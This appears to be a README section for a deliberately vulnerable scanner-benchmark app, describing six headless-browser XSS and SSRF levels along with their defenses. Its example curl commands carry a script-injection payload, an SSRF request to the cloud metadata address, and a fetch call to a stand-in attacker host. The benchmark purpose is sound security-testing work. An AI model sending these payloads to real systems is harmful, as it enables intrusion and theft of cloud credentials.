# Headless Generator XSS Category

This section can be added to the main README.md to document the new headless generator category.

---

## Headless Generator XSS (6 levels)

Simulates backend PDF/Image generation services that use headless browsers (Puppeteer, Playwright, Headless Chrome) to convert HTML/SVG to PDF/PNG. These scenarios test scanner capability to detect server-side JavaScript execution and SSRF vulnerabilities.

### Category: `headless-generator`

All endpoints accept POST requests with HTML or SVG content.

| Level | Endpoint | Description | Vulnerability Type |
|-------|----------|-------------|-------------------|
| 1 | `/headless-generator/level1/` | HTML to PDF - no filtering | Direct XSS reflection |
| 2 | `/headless-generator/level2/` | SVG to PNG - no filtering | SVG script execution |
| 3 | `/headless-generator/level3/` | HTML with basic sanitization | Sanitization bypass |
| 4 | `/headless-generator/level4/` | SSRF via resource loading | SSRF + XSS |
| 5 | `/headless-generator/level5/` | JavaScript callback simulation | Out-of-band XSS |
| 6 | `/headless-generator/level6/` | Content-Type validation | Content-Type bypass |

### Example Usage

**Level 1 - Basic HTML Reflection:**
```bash
curl -X POST http://localhost:3000/headless-generator/level1/ \
  -d 'html=<script>alert(1)</script>'
```

**Level 4 - SSRF via Image Loading:**
```bash
curl -X POST http://localhost:3000/headless-generator/level4/ \
  -d 'html=<img src="http://169.254.169.254/latest/meta-data">'
```

**Level 5 - Out-of-Band Callback:**
```bash
# Submit HTML with JavaScript
curl -X POST http://localhost:3000/headless-generator/level5/ \
  -d 'html=<script>fetch("http://attacker.com/")</script>&callback_id=abc123'

# Check callback log
curl http://localhost:3000/headless-generator/level5/callback/abc123
```

### Testing Capabilities

This category helps benchmark scanner performance on:

- ✅ POST method support and form handling
- ✅ Headless browser context detection
- ✅ JavaScript execution in backend rendering
- ✅ SSRF via HTML resource loading
- ✅ Out-of-band (OOB) XSS detection
- ✅ Content-Type confusion attacks
- ✅ SVG-based XSS vectors
- ✅ Sanitization bypass techniques

### Real-World Context

Backend PDF/Image generation is commonly used in:
- Invoice/receipt generation
- Report exports
- Screenshot services
- HTML email to image conversion
- Dynamic document creation

These services are vulnerable when:
- User-supplied HTML/SVG is rendered without sanitization
- JavaScript execution is enabled in headless browser
- Network access allows SSRF attacks
- File system access allows local file reading

### Solution Guide

Comprehensive solutions and exploitation techniques are documented in:
- `SOLUTIONS_HEADLESS_GENERATOR.md` - Step-by-step solutions for each level
- `IMPLEMENTATION_SUMMARY.md` - Technical implementation details

### Defense Strategies

Key mitigations covered:
- HTML sanitization (DOMPurify, Bleach)
- Content Security Policy (CSP)
- Network isolation and IP filtering
- Disabling JavaScript in headless browsers
- Request interception and validation
- Secure browser configuration

---

**Note:** This category focuses on POST endpoints, unlike most other XSSMaze categories which use GET. This tests scanner capability to handle different HTTP methods and request body parsing.
